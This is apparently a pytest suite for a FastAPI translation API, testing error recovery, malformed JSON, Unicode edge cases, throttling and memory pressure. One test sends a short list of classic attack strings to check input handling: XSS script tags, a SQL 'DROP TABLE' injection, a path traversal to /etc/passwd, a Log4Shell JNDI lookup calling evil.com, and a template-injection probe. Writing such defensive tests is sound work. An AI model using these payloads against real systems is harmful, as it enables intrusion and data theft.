"""
Advanced Error Scenario Testing
Tests complex error combinations, recovery scenarios, and edge cases
"""

import pytest
import json
import time
import threading
from unittest.mock import patch, MagicMock, Mock
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Any, Optional, Union
import random
import string
import sys
import traceback

from fastapi.testclient import TestClient
from app.main import app


class ErrorScenarioGenerator:
    """Generates complex error scenarios for testing"""
    
    def __init__(self):
        self.error_combinations = [
            {'primary': 'network_failure', 'secondary': 'timeout', 'recovery': 'retry'},
            {'primary': 'memory_error', 'secondary': 'model_failure', 'recovery': 'graceful_degradation'},
            {'primary': 'authentication_failure', 'secondary': 'rate_limit', 'recovery': 'circuit_breaker'},
            {'primary': 'malformed_input', 'secondary': 'encoding_error', 'recovery': 'input_sanitization'},
            {'primary': 'resource_exhaustion', 'secondary': 'concurrent_access', 'recovery': 'resource_throttling'}
        ]
        
        self.error_history = []
    
    def generate_malformed_json_variations(self) -> List[Dict[str, Any]]:
        """Generate various malformed JSON scenarios"""
        return [
            # Missing required fields
            {"source_lang": "eng_Latn", "target_lang": "fra_Latn"},  # Missing text
            {"text": "Hello", "target_lang": "fra_Latn"},  # Missing source_lang
            {"text": "Hello", "source_lang": "eng_Latn"},  # Missing target_lang
            
            # Invalid field types
            {"text": 123, "source_lang": "eng_Latn", "target_lang": "fra_Latn"},  # text as number
            {"text": "Hello", "source_lang": None, "target_lang": "fra_Latn"},  # null source_lang
            {"text": "Hello", "source_lang": "eng_Latn", "target_lang": []},  # target_lang as array
            
            # Invalid field values
            {"text": "", "source_lang": "eng_Latn", "target_lang": "fra_Latn"},  # empty text
            {"text": "Hello", "source_lang": "invalid_lang", "target_lang": "fra_Latn"},  # invalid language code
            {"text": "Hello", "source_lang": "eng_Latn", "target_lang": "invalid_target"},  # invalid target
            
            # Extra/unexpected fields
            {"text": "Hello", "source_lang": "eng_Latn", "target_lang": "fra_Latn", "malicious_field": "<script>alert('xss')</script>"},
            {"text": "Hello", "source_lang": "eng_Latn", "target_lang": "fra_Latn", "nested": {"deep": {"value": "test"}}},
            
            # Extreme values
            {"text": "x" * 100000, "source_lang": "eng_Latn", "target_lang": "fra_Latn"},  # very long text
            {"text": "Hello", "source_lang": "x" * 1000, "target_lang": "fra_Latn"},  # very long lang code
        ]
    
    def generate_unicode_edge_cases(self) -> List[str]:
        """Generate Unicode edge cases for testing"""
        return [
            # Control characters
            "Hello\x00World",  # Null byte
            "Test\x01\x02\x03",  # Control characters
            "Line\r\nBreak\n\rTest",  # Various line breaks
            
            # Unicode normalization issues
            "café",  # Composed form
            "cafe\u0301",  # Decomposed form
            "\u0041\u0300",  # A with combining grave accent
            
            # Bidirectional text
            "Hello \u202Eworld\u202D",  # Right-to-left override
            "English العربية English",  # Mixed LTR/RTL
            
            # Emoji and special characters
            "Hello 👋 World 🌍",  # Emoji
            "Test\u200B\u200C\u200D",  # Zero-width characters
            "Text\uFEFFwith\uFEFFBOM",  # Byte order marks
            
            # Surrogate pairs and invalid Unicode
            "High\uD800Low\uDC00",  # Valid surrogate pair
            "\uD800\uD800",  # Invalid surrogate sequence
            "\uDC00\uDC00",  # Invalid surrogate sequence
            
            # Mathematical and symbolic Unicode
            "∑∏∫∆√∞≠≤≥±×÷",  # Mathematical symbols
            "αβγδεζηθικλμνξοπρστυφχψω",  # Greek letters
            "ℵℶℷℸ",  # Hebrew letters used in mathematics
        ]
    
    def create_resource_exhaustion_scenario(self) -> Dict[str, Any]:
        """Create resource exhaustion scenarios"""
        return {
            'concurrent_requests': random.randint(50, 100),
            'memory_pressure': True,
            'cpu_intensive': True,
            'file_descriptor_limit': True,
            'network_congestion': True
        }


class ErrorRecoveryTester:
    """Tests error recovery mechanisms"""
    
    def __init__(self):
        self.recovery_strategies = {
            'retry': self.test_retry_strategy,
            'graceful_degradation': self.test_graceful_degradation,
            'circuit_breaker': self.test_circuit_breaker,
            'input_sanitization': self.test_input_sanitization,
            'resource_throttling': self.test_resource_throttling
        }
        
        self.test_results = {
            'recovery_tests': [],
            'error_patterns': [],
            'stability_metrics': []
        }
    
    def test_retry_strategy(self, client: TestClient, error_scenario: Dict[str, Any]) -> Dict[str, Any]:
        """Test retry recovery strategy"""
        retry_attempts = 0
        max_retries = 3
        success = False
        
        for attempt in range(max_retries):
            retry_attempts += 1
            
            try:
                response = client.post(
                    "/translate",
                    json={
                        "text": f"Retry test attempt {attempt}",
                        "source_lang": "eng_Latn",
                        "target_lang": "fra_Latn"
                    },
                    headers={"X-API-Key": "test_api_key"}
                )
                
                if response.status_code == 200:
                    success = True
                    break
                    
            except Exception as e:
                if attempt == max_retries - 1:
                    raise e
                time.sleep(0.1 * (attempt + 1))  # Exponential backoff
        
        return {
            'strategy': 'retry',
            'attempts': retry_attempts,
            'success': success,
            'max_retries': max_retries
        }
    
    def test_graceful_degradation(self, client: TestClient, error_scenario: Dict[str, Any]) -> Dict[str, Any]:
        """Test graceful degradation recovery"""
        # Test that system provides meaningful response even during errors
        degradation_response = client.post(
            "/translate",
            json={
                "text": "Graceful degradation test",
                "source_lang": "eng_Latn", 
                "target_lang": "fra_Latn"
            },
            headers={"X-API-Key": "test_api_key"}
        )
        
        # Even if translation fails, should get structured error response
        response_data = degradation_response.json() if degradation_response.content else {}
        
        return {
            'strategy': 'graceful_degradation',
            'status_code': degradation_response.status_code,
            'has_error_info': 'detail' in response_data or 'error' in response_data,
            'structured_response': isinstance(response_data, dict)
        }
    
    def test_circuit_breaker(self, client: TestClient, error_scenario: Dict[str, Any]) -> Dict[str, Any]:
        """Test circuit breaker pattern"""
        # Simulate multiple failing requests to trigger circuit breaker
        failure_count = 0
        success_count = 0
        
        for i in range(10):
            response = client.post(
                "/translate",
                json={
                    "text": f"Circuit breaker test {i}",
                    "source_lang": "eng_Latn",
                    "target_lang": "fra_Latn"
                },
                headers={"X-API-Key": "test_api_key"}
            )
            
            if response.status_code == 200:
                success_count += 1
            else:
                failure_count += 1
            
            time.sleep(0.1)
        
        return {
            'strategy': 'circuit_breaker',
            'total_requests': 10,
            'failures': failure_count,
            'successes': success_count,
            'failure_rate': failure_count / 10
        }
    
    def test_input_sanitization(self, client: TestClient, error_scenario: Dict[str, Any]) -> Dict[str, Any]:
        """Test input sanitization recovery"""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}{{user.name}}"
        ]
        
        sanitization_results = []
        
        for malicious_input in malicious_inputs:
            response = client.post(
                "/translate",
                json={
                    "text": malicious_input,
                    "source_lang": "eng_Latn",
                    "target_lang": "fra_Latn"
                },
                headers={"X-API-Key": "test_api_key"}
            )
            
            sanitization_results.append({
                'input': malicious_input[:50] + "..." if len(malicious_input) > 50 else malicious_input,
                'status_code': response.status_code,
                'safe_handling': response.status_code in [200, 400, 422]  # Either processed safely or rejected
            })
        
        safe_handling_count = sum(1 for r in sanitization_results if r['safe_handling'])
        
        return {
            'strategy': 'input_sanitization',
            'total_tests': len(malicious_inputs),
            'safe_handling_count': safe_handling_count,
            'safety_rate': safe_handling_count / len(malicious_inputs),
            'results': sanitization_results
        }
    
    def test_resource_throttling(self, client: TestClient, error_scenario: Dict[str, Any]) -> Dict[str, Any]:
        """Test resource throttling recovery"""
        # Generate concurrent requests to test throttling
        concurrent_count = 20
        results = []
        
        def make_request(request_id: int):
            start_time = time.time()
            response = client.post(
                "/translate",
                json={
                    "text": f"Throttling test {request_id}",
                    "source_lang": "eng_Latn",
                    "target_lang": "fra_Latn"
                },
                headers={"X-API-Key": "test_api_key"}
            )
            execution_time = time.time() - start_time
            
            return {
                'request_id': request_id,
                'status_code': response.status_code,
                'execution_time': execution_time,
                'throttled': response.status_code == 429
            }
        
        # Execute concurrent requests
        with ThreadPoolExecutor(max_workers=concurrent_count) as executor:
            futures = [executor.submit(make_request, i) for i in range(concurrent_count)]
            results = [future.result() for future in futures]
        
        throttled_count = sum(1 for r in results if r['throttled'])
        successful_count = sum(1 for r in results if r['status_code'] == 200)
        avg_response_time = sum(r['execution_time'] for r in results) / len(results)
        
        return {
            'strategy': 'resource_throttling',
            'total_requests': concurrent_count,
            'throttled_requests': throttled_count,
            'successful_requests': successful_count,
            'avg_response_time': avg_response_time,
            'throttling_effective': throttled_count > 0 or avg_response_time < 5.0
        }


class TestAdvancedErrorScenarios:
    """Advanced Error Scenario Test Suite"""
    
    @pytest.fixture(autouse=True)
    def setup(self, enhanced_mock_objects):
        """Setup for advanced error testing"""
        self.error_generator = ErrorScenarioGenerator()
        self.recovery_tester = ErrorRecoveryTester()
        self.enhanced_mock_objects = enhanced_mock_objects
    
    def test_malformed_json_combinations(self, test_client, enhanced_mock_objects):
        """Test various malformed JSON combinations"""
        malformed_variations = self.error_generator.generate_malformed_json_variations()
        
        results = []
        for variation in malformed_variations:
            response = test_client.post(
                "/translate",
                json=variation,
                headers={"X-API-Key": "test_api_key"}
            )
            
            results.append({
                'input': variation,
                'status_code': response.status_code,
                'has_error_detail': 'detail' in response.json() if response.content else False,
                'appropriate_error': response.status_code in [400, 422, 403]  # Include 403 for auth issues
            })
        
        # All malformed inputs should return appropriate error codes
        appropriate_errors = sum(1 for r in results if r['appropriate_error'])
        assert appropriate_errors >= len(malformed_variations) * 0.8, f"Too many malformed inputs accepted: {appropriate_errors}/{len(malformed_variations)}"
        
        # Errors should include helpful details
        detailed_errors = sum(1 for r in results if r['has_error_detail'])
        assert detailed_errors >= len(malformed_variations) * 0.6, f"Not enough detailed error responses: {detailed_errors}/{len(malformed_variations)}"
    
    def test_unicode_edge_case_handling(self, test_client, enhanced_mock_objects):
        """Test handling of Unicode edge cases"""
        unicode_cases = self.error_generator.generate_unicode_edge_cases()
        
        unicode_results = []
        for unicode_text in unicode_cases:
            try:
                response = test_client.post(
                    "/translate",
                    json={
                        "text": unicode_text,
                        "source_lang": "eng_Latn",
                        "target_lang": "fra_Latn"
                    },
                    headers={"X-API-Key": "test_api_key"}
                )
                
                unicode_results.append({
                    'input_type': 'unicode_edge_case',
                    'input_preview': repr(unicode_text[:30]),
                    'status_code': response.status_code,
                    'handled_gracefully': response.status_code in [200, 400, 422],
                    'response_size': len(response.content) if response.content else 0
                })
                
            except Exception as e:
                unicode_results.append({
                    'input_type': 'unicode_edge_case',
                    'input_preview': repr(unicode_text[:30]),
                    'status_code': 500,
                    'handled_gracefully': False,
                    'error': str(e)
                })
        
        # Most Unicode cases should be handled gracefully
        graceful_handling = sum(1 for r in unicode_results if r['handled_gracefully'])
        assert graceful_handling >= len(unicode_cases) * 0.8, f"Poor Unicode handling: {graceful_handling}/{len(unicode_cases)}"
    
    def test_cascading_error_scenarios(self, test_client, enhanced_mock_objects):
        """Test cascading error scenarios where multiple errors occur"""
        # Simulate cascading errors by patching multiple components
        with patch('app.main.translate_text') as mock_translate, \
             patch('app.main.model') as mock_model:
            
            # Configure cascading failure scenario
            def cascading_failure(*args, **kwargs):
                # First call: model failure
                if len(mock_translate.call_args_list) == 0:
                    raise RuntimeError("Model initialization failed")
                # Second call: memory error
                elif len(mock_translate.call_args_list) == 1:
                    raise MemoryError("Insufficient memory for translation")
                # Third call: timeout
                elif len(mock_translate.call_args_list) == 2:
                    time.sleep(5)  # Simulate timeout
                    return "Translated: Should not reach here"
                # Fourth call: success (recovery)
                else:
                    return "Translated: Recovery successful"
            
            mock_translate.side_effect = cascading_failure
            
            cascading_results = []
            
            # Test multiple requests to trigger cascading failures
            for i in range(4):
                try:
                    start_time = time.time()
                    response = test_client.post(
                        "/translate",
                        json={
                            "text": f"Cascading test {i}",
                            "source_lang": "eng_Latn",
                            "target_lang": "fra_Latn"
                        },
                        headers={"X-API-Key": "test_api_key"},
                        timeout=2.0  # Short timeout for timeout test
                    )
                    execution_time = time.time() - start_time
                    
                    cascading_results.append({
                        'attempt': i,
                        'status_code': response.status_code,
                        'execution_time': execution_time,
                        'error_type': 'none' if response.status_code == 200 else 'http_error'
                    })
                    
                except Exception as e:
                    execution_time = time.time() - start_time
                    cascading_results.append({
                        'attempt': i,
                        'status_code': None,
                        'execution_time': execution_time,
                        'error_type': type(e).__name__
                    })
            
            # Validate cascading error behavior
            error_types = [r['error_type'] for r in cascading_results]
            
            # Should see progression of different error types
            assert len(set(error_types)) >= 2, f"Not enough error type diversity: {error_types}"
            
            # Final attempt should succeed (recovery)
            if len(cascading_results) > 3:
                assert cascading_results[3]['status_code'] == 200, "Recovery attempt failed"
    
    def test_error_recovery_strategies(self, test_client, enhanced_mock_objects):
        """Test various error recovery strategies"""
        recovery_scenarios = [
            {'primary_error': 'network_failure', 'recovery': 'retry'},
            {'primary_error': 'resource_exhaustion', 'recovery': 'resource_throttling'},
            {'primary_error': 'malicious_input', 'recovery': 'input_sanitization'},
            {'primary_error': 'authentication_failure', 'recovery': 'graceful_degradation'},
        ]
        
        recovery_results = []
        
        for scenario in recovery_scenarios:
            recovery_strategy = scenario['recovery']
            
            if recovery_strategy in self.recovery_tester.recovery_strategies:
                test_func = self.recovery_tester.recovery_strategies[recovery_strategy]
                result = test_func(test_client, scenario)
                recovery_results.append(result)
        
        # Validate recovery effectiveness
        for result in recovery_results:
            strategy = result['strategy']
            
            if strategy == 'retry':
                assert result['attempts'] <= result['max_retries']
                
            elif strategy == 'input_sanitization':
                assert result['safety_rate'] >= 0.8, f"Input sanitization ineffective: {result['safety_rate']:.2%}"
                
            elif strategy == 'resource_throttling':
                assert result['throttling_effective'], "Resource throttling not working"
                
            elif strategy == 'graceful_degradation':
                assert result['structured_response'], "No structured error response"
    
    def test_concurrent_error_handling(self, test_client, enhanced_mock_objects):
        """Test error handling under concurrent load"""
        concurrent_requests = 15
        error_injection_rate = 0.3  # 30% of requests will have errors
        
        def make_concurrent_request(request_id: int) -> Dict[str, Any]:
            # Randomly inject errors
            if random.random() < error_injection_rate:
                # Inject various error conditions
                error_types = [
                    {"text": None, "source_lang": "eng_Latn", "target_lang": "fra_Latn"},  # None text
                    {"text": "test", "source_lang": None, "target_lang": "fra_Latn"},  # None source
                    {"text": "", "source_lang": "eng_Latn", "target_lang": "fra_Latn"},  # Empty text
                    {"malformed": "request"},  # Completely malformed
                ]
                request_data = random.choice(error_types)
            else:
                request_data = {
                    "text": f"Concurrent test {request_id}",
                    "source_lang": "eng_Latn",
                    "target_lang": "fra_Latn"
                }
            
            start_time = time.time()
            
            try:
                response = test_client.post(
                    "/translate",
                    json=request_data,
                    headers={"X-API-Key": "test_api_key"}
                )
                
                return {
                    'request_id': request_id,
                    'status_code': response.status_code,
                    'execution_time': time.time() - start_time,
                    'error_injected': random.random() < error_injection_rate,
                    'handled_properly': response.status_code in [200, 400, 422]
                }
                
            except Exception as e:
                return {
                    'request_id': request_id,
                    'status_code': None,
                    'execution_time': time.time() - start_time,
                    'error_injected': True,
                    'handled_properly': False,
                    'exception': str(e)
                }
        
        # Execute concurrent requests with error injection
        with ThreadPoolExecutor(max_workers=concurrent_requests) as executor:
            futures = [executor.submit(make_concurrent_request, i) for i in range(concurrent_requests)]
            concurrent_results = [future.result() for future in futures]
        
        # Analyze concurrent error handling
        properly_handled = sum(1 for r in concurrent_results if r['handled_properly'])
        avg_response_time = sum(r['execution_time'] for r in concurrent_results) / len(concurrent_results)
        max_response_time = max(r['execution_time'] for r in concurrent_results)
        
        # Validate concurrent error handling
        handling_rate = properly_handled / len(concurrent_results)
        assert handling_rate >= 0.8, f"Poor concurrent error handling: {handling_rate:.2%}"
        assert avg_response_time < 3.0, f"Slow concurrent response: {avg_response_time:.3f}s"
        assert max_response_time < 10.0, f"Excessive max response time: {max_response_time:.3f}s"
    
    def test_memory_pressure_error_handling(self, test_client, enhanced_mock_objects):
        """Test error handling under memory pressure"""
        # Simulate memory pressure by creating large objects
        memory_hogs = []
        
        try:
            # Create memory pressure
            for i in range(5):
                memory_hogs.append([0] * 1000000)  # ~8MB per list
            
            # Test API under memory pressure
            memory_pressure_results = []
            
            for i in range(10):
                start_time = time.time()
                response = test_client.post(
                    "/translate",
                    json={
                        "text": f"Memory pressure test {i}",
                        "source_lang": "eng_Latn",
                        "target_lang": "fra_Latn"
                    },
                    headers={"X-API-Key": "test_api_key"}
                )
                execution_time = time.time() - start_time
                
                memory_pressure_results.append({
                    'request_id': i,
                    'status_code': response.status_code,
                    'execution_time': execution_time,
                    'memory_handled': response.status_code in [200, 503]  # Success or service unavailable
                })
            
            # Validate memory pressure handling
            memory_handling_count = sum(1 for r in memory_pressure_results if r['memory_handled'])
            avg_execution_time = sum(r['execution_time'] for r in memory_pressure_results) / len(memory_pressure_results)
            
            assert memory_handling_count >= 7, f"Poor memory pressure handling: {memory_handling_count}/10"
            assert avg_execution_time < 5.0, f"Slow response under memory pressure: {avg_execution_time:.3f}s"
            
        finally:
            # Clean up memory
            del memory_hogs
    
    def test_exception_chain_handling(self, test_client, enhanced_mock_objects):
        """Test handling of chained exceptions"""
        with patch('app.main.translate_text') as mock_translate:
            # Create chained exception scenario
            def chained_exception_func(*args, **kwargs):
                try:
                    raise ValueError("Primary error")
                except ValueError as primary_error:
                    try:
                        raise RuntimeError("Secondary error") from primary_error
                    except RuntimeError as secondary_error:
                        raise ConnectionError("Final error") from secondary_error
            
            mock_translate.side_effect = chained_exception_func
            
            # Test exception chain handling
            response = test_client.post(
                "/translate",
                json={
                    "text": "Exception chain test",
                    "source_lang": "eng_Latn",
                    "target_lang": "fra_Latn"
                },
                headers={"X-API-Key": "test_api_key"}
            )
            
            # Should handle chained exceptions gracefully
            assert response.status_code in [400, 500], f"Unexpected status for chained exception: {response.status_code}"
            
            # Should provide structured error response
            if response.content:
                error_data = response.json()
                assert isinstance(error_data, dict), "Error response should be structured"
                assert 'detail' in error_data or 'error' in error_data, "Error response should contain details"